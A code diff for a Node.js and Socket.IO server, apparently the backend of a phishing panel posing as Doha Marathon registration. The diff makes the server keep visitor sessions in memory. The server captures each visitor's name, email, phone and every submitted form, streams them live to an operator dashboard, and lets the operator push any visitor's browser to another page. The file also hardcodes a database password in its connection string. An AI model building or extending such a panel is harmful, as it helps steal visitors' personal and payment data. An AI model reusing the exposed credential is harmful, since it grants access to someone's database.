@@ -16,19 +16,24 @@ const PROJECT_NAME = process.env.PROJECT_NAME || "ماراثون الدوحة 20
 
 const DATABASE_URL = process.env.DATABASE_URL || "postgresql://postgres:.8gq-%2BgVt%21UUN%40%3F@db.difwpmsmqxvbtsslrdov.supabase.co:5432/postgres";
 
+let dbReady = false;
 const pool = new Pool({
   connectionString: DATABASE_URL,
-  ssl: { rejectUnauthorized: false }
+  ssl: { rejectUnauthorized: false },
+  connectionTimeoutMillis: 10000,
+  idleTimeoutMillis: 30000,
+  max: 5
 });
 
 const io = new Server(server, {
-  cors: { origin: "*", methods: ["GET", "POST"], credentials: true }
+  cors: { origin: true, methods: ["GET", "POST"], credentials: true }
 });
 
 app.use(cors({ origin: true, credentials: true }));
 app.use(express.json({ limit: "10mb" }));
 
-// --- In-memory cache (for real-time socket tracking) ---
+// --- In-memory session store (PRIMARY source for real-time data) ---
+const sessions = new Map();
 const liveSockets = new Map();
 const authTokens = new Set();
 
@@ -44,7 +49,52 @@ function authMiddleware(req, res, next) {
   next();
 }
 
-// --- Initialize database tables ---
+// --- In-memory session helpers ---
+function getSessionMem(sessionId) {
+  return sessions.get(sessionId) || null;
+}
+
+function upsertSessionMem(sessionId, data) {
+  const existing = sessions.get(sessionId) || {
+    sessionId,
+    name: "",
+    email: "",
+    phone: "",
+    currentPage: "index",
+    isConnected: false,
+    formData: {},
+    lastSeen: Date.now()
+  };
+
+  if (data.name) existing.name = data.name;
+  if (data.email) existing.email = data.email;
+  if (data.phone) existing.phone = data.phone;
+  if (data.currentPage) existing.currentPage = data.currentPage;
+  if (data.isConnected !== undefined) existing.isConnected = data.isConnected;
+  if (data.formData) {
+    if (!existing.formData) existing.formData = {};
+    Object.assign(existing.formData, data.formData);
+  }
+  existing.lastSeen = Date.now();
+
+  sessions.set(sessionId, existing);
+  return existing;
+}
+
+function getStatsMem() {
+  let connected = 0;
+  let total = sessions.size;
+  for (const s of sessions.values()) {
+    if (s.isConnected) connected++;
+  }
+  return { connectedUsers: connected, totalRegistrations: total };
+}
+
+function getAllSessionsMem() {
+  return Array.from(sessions.values()).sort((a, b) => (b.lastSeen || 0) - (a.lastSeen || 0));
+}
+
+// --- DB helpers (background sync, never blocks real-time) ---
 async function initDB() {
   try {
     await pool.query(`
@@ -60,103 +110,63 @@ async function initDB() {
         created_at TIMESTAMPTZ DEFAULT NOW()
       )
     `);
-    console.log("Database tables ready");
-  } catch (err) {
-    console.error("DB init error:", err.message);
-  }
-}
+    dbReady = true;
+    console.log("[DB] Tables ready, database connected");
 
-// --- DB helpers ---
-async function upsertSession(sessionId, data) {
-  try {
-    await pool.query(`
-      INSERT INTO sessions (session_id, name, email, phone, current_page, is_connected, form_data, last_seen)
-      VALUES ($1, $2, $3, $4, $5, $6, $7, $8)
-      ON CONFLICT (session_id) DO UPDATE SET
-        name = COALESCE(NULLIF($2, ''), sessions.name),
-        email = COALESCE(NULLIF($3, ''), sessions.email),
-        phone = COALESCE(NULLIF($4, ''), sessions.phone),
-        current_page = COALESCE($5, sessions.current_page),
-        is_connected = $6,
-        form_data = sessions.form_data || $7,
-        last_seen = $8
-    `, [
-      sessionId,
-      data.name || "",
-      data.email || "",
-      data.phone || "",
-      data.currentPage || "index",
-      data.isConnected || false,
-      JSON.stringify(data.formData || {}),
-      Date.now()
-    ]);
-  } catch (err) {
-    console.error("DB upsert error:", err.message);
-  }
-}
-
-async function getSession(sessionId) {
-  try {
-    const res = await pool.query("SELECT * FROM sessions WHERE session_id = $1", [sessionId]);
-    if (res.rows.length === 0) return null;
-    const r = res.rows[0];
-    return {
-      sessionId: r.session_id,
-      name: r.name,
-      email: r.email,
-      phone: r.phone,
-      currentPage: r.current_page,
-      isConnected: r.is_connected,
-      formData: r.form_data || {},
-      lastSeen: parseInt(r.last_seen)
-    };
-  } catch (err) {
-    console.error("DB get error:", err.message);
-    return null;
-  }
-}
-
-async function getAllSessions() {
-  try {
     const res = await pool.query("SELECT * FROM sessions ORDER BY last_seen DESC");
-    return res.rows.map(r => ({
-      sessionId: r.session_id,
-      name: r.name,
-      email: r.email,
-      phone: r.phone,
-      currentPage: r.current_page,
-      isConnected: r.is_connected,
-      formData: r.form_data || {},
-      lastSeen: parseInt(r.last_seen)
-    }));
+    let loaded = 0;
+    for (const r of res.rows) {
+      if (!sessions.has(r.session_id)) {
+        sessions.set(r.session_id, {
+          sessionId: r.session_id,
+          name: r.name || "",
+          email: r.email || "",
+          phone: r.phone || "",
+          currentPage: r.current_page || "index",
+          isConnected: false,
+          formData: r.form_data || {},
+          lastSeen: parseInt(r.last_seen) || Date.now()
+        });
+        loaded++;
+      }
+    }
+    if (loaded > 0) console.log(`[DB] Loaded ${loaded} sessions from database`);
   } catch (err) {
-    console.error("DB getAll error:", err.message);
-    return [];
+    dbReady = false;
+    console.error("[DB] Init error (will use in-memory only):", err.message);
   }
 }
 
-async function getStats() {
-  try {
-    const res = await pool.query(`
-      SELECT
-        COUNT(*) FILTER (WHERE is_connected = true) AS connected,
-        COUNT(*) AS total
-      FROM sessions
-    `);
-    const r = res.rows[0];
-    return { connectedUsers: parseInt(r.connected), totalRegistrations: parseInt(r.total) };
-  } catch (err) {
-    console.error("DB stats error:", err.message);
-    return { connectedUsers: 0, totalRegistrations: 0 };
-  }
+function dbSync(sessionId, data) {
+  if (!dbReady) return;
+  pool.query(`
+    INSERT INTO sessions (session_id, name, email, phone, current_page, is_connected, form_data, last_seen)
+    VALUES ($1, $2, $3, $4, $5, $6, $7, $8)
+    ON CONFLICT (session_id) DO UPDATE SET
+      name = COALESCE(NULLIF($2, ''), sessions.name),
+      email = COALESCE(NULLIF($3, ''), sessions.email),
+      phone = COALESCE(NULLIF($4, ''), sessions.phone),
+      current_page = COALESCE($5, sessions.current_page),
+      is_connected = $6,
+      form_data = sessions.form_data || $7,
+      last_seen = $8
+  `, [
+    sessionId,
+    data.name || "",
+    data.email || "",
+    data.phone || "",
+    data.currentPage || "index",
+    data.isConnected || false,
+    JSON.stringify(data.formData || {}),
+    Date.now()
+  ]).catch(err => console.error("[DB] Sync error:", err.message));
 }
 
-async function setConnected(sessionId, connected) {
-  try {
-    await pool.query("UPDATE sessions SET is_connected = $1, last_seen = $2 WHERE session_id = $3", [connected, Date.now(), sessionId]);
-  } catch (err) {
-    console.error("DB setConnected error:", err.message);
-  }
+function dbSetConnected(sessionId, connected) {
+  if (!dbReady) return;
+  pool.query("UPDATE sessions SET is_connected = $1, last_seen = $2 WHERE session_id = $3",
+    [connected, Date.now(), sessionId]
+  ).catch(err => console.error("[DB] SetConnected error:", err.message));
 }
 
 // --- Auth endpoints ---
@@ -181,31 +191,31 @@ app.get("/api/config", (req, res) => {
   res.json({ projectName: PROJECT_NAME });
 });
 
-app.get("/api/stats", authMiddleware, async (req, res) => {
-  const stats = await getStats();
+app.get("/api/stats", authMiddleware, (req, res) => {
+  const stats = getStatsMem();
   res.json({ ...stats, activeUsers: stats.connectedUsers });
 });
 
-app.get("/api/users", authMiddleware, async (req, res) => {
-  const list = await getAllSessions();
-  res.json(list);
+app.get("/api/users", authMiddleware, (req, res) => {
+  res.json(getAllSessionsMem());
 });
 
-app.get("/api/user/:sessionId", authMiddleware, async (req, res) => {
-  const data = await getSession(req.params.sessionId);
+app.get("/api/user/:sessionId", authMiddleware, (req, res) => {
+  const data = getSessionMem(req.params.sessionId);
   if (!data) return res.status(404).json({ error: "مستخدم غير موجود" });
   res.json(data);
 });
 
-app.post("/api/track", async (req, res) => {
+app.post("/api/track", (req, res) => {
   const { sessionId, type, page, data } = req.body || {};
   if (!sessionId) return res.status(400).json({ error: "missing sessionId" });
 
-  let session = await getSession(sessionId) || { isConnected: false, currentPage: "index", formData: {} };
+  let session = getSessionMem(sessionId) || { currentPage: "index", formData: {} };
 
   if (type === "form-submit" && data) {
-    if (!session.formData) session.formData = {};
-    session.formData[page || "unknown"] = data;
+    const formUpdate = {};
+    formUpdate[page || "unknown"] = data;
+    session.formData = Object.assign(session.formData || {}, formUpdate);
     if (data.firstName) session.name = [data.firstName, data.lastName].filter(Boolean).join(" ");
     if (data.email) session.email = data.email;
     if (data.phone) session.phone = data.phone;
@@ -213,9 +223,22 @@ app.post("/api/track", async (req, res) => {
 
   if (page) session.currentPage = page;
 
-  await upsertSession(sessionId, session);
-  emitToDashboard(sessionId, session, type === "form-submit" ? "form-submit" : "update", page, data);
+  const updated = upsertSessionMem(sessionId, session);
+  dbSync(sessionId, updated);
+  emitToDashboard(sessionId, updated, type === "form-submit" ? "form-submit" : "update", page, data);
   res.json({ ok: true });
+});
+
+app.get("/api/health", (req, res) => {
+  const stats = getStatsMem();
+  res.json({
+    status: "ok",
+    dbReady,
+    sessionsInMemory: sessions.size,
+    liveSocketsCount: liveSockets.size,
+    connectedUsers: stats.connectedUsers,
+    totalRegistrations: stats.totalRegistrations
+  });
 });
 
 // --- Helper: emit events in dashboard-expected format ---
@@ -227,7 +250,7 @@ function emitToDashboard(sessionId, session, eventType, page, formData) {
     email: session.email || "",
     phone: session.phone || "",
     isConnected: session.isConnected,
-    formData: formData || session.formData[session.currentPage] || {},
+    formData: formData || (session.formData && session.formData[session.currentPage]) || {},
     allFormData: session.formData
   };
 
@@ -249,78 +272,66 @@ io.on("connection", (socket) => {
 
   if (token || instanceKey) {
     socket.join("dashboard");
+    console.log("[WS] Dashboard socket joined:", socket.id);
   }
 
   if (sessionId) {
     liveSockets.set(sessionId, socket.id);
+    console.log("[WS] Visitor connected:", sessionId);
 
-    (async () => {
-      let session = await getSession(sessionId);
-      if (!session) {
-        session = { isConnected: true, currentPage: "index", formData: {} };
-      }
-      session.isConnected = true;
-      await upsertSession(sessionId, session);
-      emitToDashboard(sessionId, session, "connected");
-    })();
+    const session = upsertSessionMem(sessionId, { isConnected: true });
+    dbSync(sessionId, session);
+    emitToDashboard(sessionId, session, "connected");
 
-    socket.on("user:join", async ({ page }) => {
-      let session = await getSession(sessionId) || { formData: {} };
-      session.currentPage = page || "index";
-      session.isConnected = true;
-      await upsertSession(sessionId, session);
-      emitToDashboard(sessionId, session, "connected");
+    socket.on("user:join", ({ page }) => {
+      const s = upsertSessionMem(sessionId, { currentPage: page || "index", isConnected: true });
+      dbSync(sessionId, s);
+      emitToDashboard(sessionId, s, "connected");
     });
 
-    socket.on("user:form-submit", async ({ page, formData }) => {
-      let session = await getSession(sessionId) || { formData: {} };
-      if (!session.formData) session.formData = {};
+    socket.on("user:form-submit", ({ page, formData }) => {
+      const existing = getSessionMem(sessionId) || { formData: {} };
+      const update = { isConnected: true, formData: existing.formData || {} };
       if (page && formData) {
-        session.formData[page] = formData;
-        if (formData.firstName) session.name = [formData.firstName, formData.lastName].filter(Boolean).join(" ");
-        if (formData.email) session.email = formData.email;
-        if (formData.phone) session.phone = formData.phone;
+        update.formData[page] = formData;
+        if (formData.firstName) update.name = [formData.firstName, formData.lastName].filter(Boolean).join(" ");
+        if (formData.email) update.email = formData.email;
+        if (formData.phone) update.phone = formData.phone;
       }
-      session.isConnected = true;
-      await upsertSession(sessionId, session);
-      emitToDashboard(sessionId, session, "form-submit", page, formData);
+      const s = upsertSessionMem(sessionId, update);
+      dbSync(sessionId, s);
+      emitToDashboard(sessionId, s, "form-submit", page, formData);
     });
 
-    socket.on("user:page-change", async ({ page }) => {
-      let session = await getSession(sessionId) || { formData: {} };
-      session.currentPage = page || session.currentPage;
-      session.isConnected = true;
-      await upsertSession(sessionId, session);
-      emitToDashboard(sessionId, session, "page-change");
+    socket.on("user:page-change", ({ page }) => {
+      const s = upsertSessionMem(sessionId, { currentPage: page, isConnected: true });
+      dbSync(sessionId, s);
+      emitToDashboard(sessionId, s, "page-change");
     });
 
-    socket.on("disconnect", async () => {
+    socket.on("disconnect", () => {
       liveSockets.delete(sessionId);
-      await setConnected(sessionId, false);
-      const session = await getSession(sessionId);
-      if (session) {
-        emitToDashboard(sessionId, session, "disconnected");
-      }
+      console.log("[WS] Visitor disconnected:", sessionId);
+      const s = upsertSessionMem(sessionId, { isConnected: false });
+      dbSetConnected(sessionId, false);
+      emitToDashboard(sessionId, s, "disconnected");
     });
   }
 
-  socket.on("navigate", async ({ sessionId: targetId, page }) => {
+  socket.on("navigate", ({ sessionId: targetId, page }) => {
     const targetSocketId = liveSockets.get(targetId);
     if (targetSocketId) {
       io.to(targetSocketId).emit("navigate", { page });
-      let session = await getSession(targetId);
-      if (session) {
-        session.currentPage = page;
-        await upsertSession(targetId, session);
-        io.to("dashboard").emit("user:update", { sessionId: targetId, ...session });
-      }
+      const s = upsertSessionMem(targetId, { currentPage: page });
+      dbSync(targetId, s);
+      io.to("dashboard").emit("user:update", { sessionId: targetId, ...s });
     }
   });
 });
 
 // --- Broadcast live stats every 3 seconds ---
-setInterval(async () => {
-  const stats = await getStats();
+setInterval(() => {
+  const stats = getStatsMem();
   io.to("dashboard").emit("stats:live", {
     connectedUsers: stats.connectedUsers,
     totalRegistrations: stats.totalRegistrations,
@@ -345,6 +356,7 @@ app.get("*", (req, res) => {
 // --- Start server ---
 initDB().then(() => {
   server.listen(PORT, () => {
-    console.log("Server running on port " + PORT);
+    console.log("[Server] Running on port " + PORT);
+    console.log("[Server] DB status:", dbReady ? "connected" : "in-memory only");
   });
 });
